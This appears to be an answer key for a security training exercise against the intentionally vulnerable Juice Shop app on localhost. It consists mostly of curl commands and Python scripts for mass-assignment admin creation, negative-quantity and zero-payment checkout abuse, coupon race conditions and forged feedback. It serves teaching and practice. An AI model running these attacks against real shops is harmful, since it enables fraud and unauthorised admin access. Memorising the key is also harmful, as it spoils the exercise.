# Exercise 06: API Security & Exploitation - ANSWERS

## Task 6.1: API Discovery & Documentation

### Finding API Documentation:

```bash
# Swagger/OpenAPI endpoints
curl http://localhost:8000/api-docs
curl http://localhost:8000/api-docs/swagger.json
curl http://localhost:8000/swagger.json

# The Swagger UI is available at:
# http://localhost:8000/api-docs
```

### API Endpoints Discovered:

```bash
# Extract from JavaScript
curl -s http://localhost:8000/main.js | grep -oE '/api/[^"]*' | sort -u
curl -s http://localhost:8000/main.js | grep -oE '/rest/[^"]*' | sort -u
```

**Complete API Map:**

| Endpoint | Method | Auth Required | Description |
|----------|--------|---------------|-------------|
| /api/Users | GET/POST | Yes/No | List/Create users |
| /api/Users/{id} | GET/PUT/DELETE | Yes | User operations |
| /api/Products | GET | No | List products |
| /api/Products/{id} | GET | No | Get product |
| /api/Feedbacks | GET/POST | Yes | Feedback operations |
| /api/Challenges | GET | No | List challenges |
| /api/Quantitys | GET | Yes | Quantity data |
| /api/Complaints | GET/POST | Yes | Complaints |
| /api/Recycles | GET/POST | Yes | Recycle requests |
| /rest/user/login | POST | No | Login |
| /rest/user/whoami | GET | Yes | Current user info |
| /rest/basket/{id} | GET/PUT | Yes | Basket operations |
| /rest/products/search | GET | No | Search products |
| /rest/saveLoginIp | GET | Yes | Save login IP |

---

## Task 6.2: Mass Assignment Attack

### User Registration Analysis:

```bash
# Normal registration
curl -X POST http://localhost:8000/api/Users \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@test.com",
    "password": "test123"
  }'
```

### Mass Assignment Exploit:

```bash
# Try to assign admin role during registration
curl -X POST http://localhost:8000/api/Users \
  -H "Content-Type: application/json" \
  -d '{
    "email": "hacker@test.com",
    "password": "hacked123",
    "role": "admin",
    "isAdmin": true
  }'

# Try to set deluxe token
curl -X POST http://localhost:8000/api/Users \
  -H "Content-Type: application/json" \
  -d '{
    "email": "deluxe@test.com", 
    "password": "test123",
    "deluxeToken": "true"
  }'
```

### Mass Assignment on Profile Update:

```bash
TOKEN="your-jwt-token"

# Update user with additional fields
curl -X PUT http://localhost:8000/api/Users/21 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "role": "admin"
  }'
```

### Successful Mass Assignment Fields:

| Field | Effect |
|-------|--------|
| role | Can set to "admin" or "deluxe" |
| isAdmin | Boolean admin flag |
| deluxeToken | Deluxe membership |
| totpSecret | 2FA secret key |

---

## Task 6.3: Business Logic Exploitation

### Negative Quantity Attack:

```bash
TOKEN="your-jwt-token"

# Add item with negative quantity (credit instead of charge)
curl -X POST http://localhost:8000/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "ProductId": 1,
    "BasketId": 1,
    "quantity": -10
  }'

# Update existing item to negative
curl -X PUT http://localhost:8000/api/BasketItems/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "quantity": -100
  }'
```

### Coupon Exploitation:

```bash
# Find valid coupons (from /ftp/coupons_2013.md.bak)
# Format: MNEMONIC-MMYY (month/year of validity)

# Apply coupon
curl -X PUT "http://localhost:8000/rest/basket/1/coupon/WMNSDY2019" \
  -H "Authorization: Bearer $TOKEN"

# Try to apply multiple times (race condition)
for i in {1..10}; do
  curl -X PUT "http://localhost:8000/rest/basket/1/coupon/WMNSDY2019" \
    -H "Authorization: Bearer $TOKEN" &
done
wait
```

### Zero/Negative Price Attack:

```bash
# If price modification is possible in requests
curl -X PUT http://localhost:8000/api/Products/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "price": -100
  }'
```

### Forged Feedback with Higher Rating:

```bash
# Create feedback with manipulated rating
curl -X POST http://localhost:8000/api/Feedbacks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "comment": "Great shop!",
    "rating": 10,
    "UserId": 1
  }'
```

---

## Race Condition Testing:

```bash
#!/bin/bash
# race_condition.sh - Test coupon race condition

TOKEN="your-jwt-token"
COUPON="WMNSDY2019"
BASKET_ID="1"

for i in {1..20}; do
  curl -s -X PUT "http://localhost:8000/rest/basket/$BASKET_ID/coupon/$COUPON" \
    -H "Authorization: Bearer $TOKEN" \
    -o /dev/null &
done

wait
echo "Race condition test complete"
```

### Python Race Condition Script:

```python
#!/usr/bin/env python3
import requests
import threading

URL = "http://localhost:8000/rest/basket/1/coupon/WMNSDY2019"
HEADERS = {"Authorization": "Bearer your-token"}
THREADS = 20

def apply_coupon():
    r = requests.put(URL, headers=HEADERS)
    print(f"Status: {r.status_code}, Response: {r.text[:50]}")

threads = []
for _ in range(THREADS):
    t = threading.Thread(target=apply_coupon)
    threads.append(t)

# Start all at once
for t in threads:
    t.start()
for t in threads:
    t.join()
```

---

## Wallet/Payment Exploitation:

```bash
# Add to wallet with negative amount (if vulnerable)
curl -X POST http://localhost:8000/rest/wallet/balance \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "balance": -1000
  }'

# Complete payment with modified amount
curl -X POST http://localhost:8000/rest/basket/1/checkout \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "paymentId": "card_123",
    "amount": 0
  }'
```

---

## Complete API Exploitation Summary:

```
API Endpoints Discovered:
1. /api-docs - Full Swagger documentation
2. /api/Users - User CRUD operations
3. /rest/basket/{id} - Shopping cart
4. /api/BasketItems - Cart item manipulation

Mass Assignment:
- Endpoint: /api/Users (POST/PUT)
- Vulnerable Field: role, isAdmin
- Result: Can create admin users

Business Logic Flaws:
1. Flaw: Negative Quantity
   - Endpoint: /api/BasketItems
   - Exploitation: Add items with quantity: -10
   - Impact: Get credit instead of charge

2. Flaw: Coupon Race Condition  
   - Endpoint: /rest/basket/{id}/coupon/{code}
   - Exploitation: Parallel requests
   - Impact: Apply discount multiple times

3. Flaw: Zero Payment
   - Endpoint: /rest/basket/{id}/checkout
   - Exploitation: Modify payment amount
   - Impact: Complete order without paying
```

---

## Final Exploitation Script:

```python
#!/usr/bin/env python3
"""Complete Juice Shop exploitation demo"""

import requests

BASE = "http://localhost:8000"

class JuiceShopExploit:
    def __init__(self):
        self.session = requests.Session()
        self.token = None
    
    def register_admin(self, email, password):
        """Mass assignment to create admin"""
        r = self.session.post(f"{BASE}/api/Users", json={
            "email": email,
            "password": password,
            "role": "admin"
        })
        return r.json()
    
    def login(self, email, password):
        """Login and get token"""
        r = self.session.post(f"{BASE}/rest/user/login", json={
            "email": email,
            "password": password
        })
        if "token" in r.json().get("authentication", {}):
            self.token = r.json()["authentication"]["token"]
        return r.json()
    
    def negative_quantity(self, basket_id, product_id, quantity=-10):
        """Add item with negative quantity"""
        headers = {"Authorization": f"Bearer {self.token}"}
        r = self.session.post(f"{BASE}/api/BasketItems", 
            headers=headers,
            json={
                "ProductId": product_id,
                "BasketId": basket_id,
                "quantity": quantity
            })
        return r.json()
    
    def apply_coupon(self, basket_id, coupon):
        """Apply coupon code"""
        headers = {"Authorization": f"Bearer {self.token}"}
        r = self.session.put(
            f"{BASE}/rest/basket/{basket_id}/coupon/{coupon}",
            headers=headers
        )
        return r.json()

# Usage
exploit = JuiceShopExploit()
exploit.login("admin@juice-sh.op", "admin123")
print(exploit.negative_quantity(1, 1, -10))
```
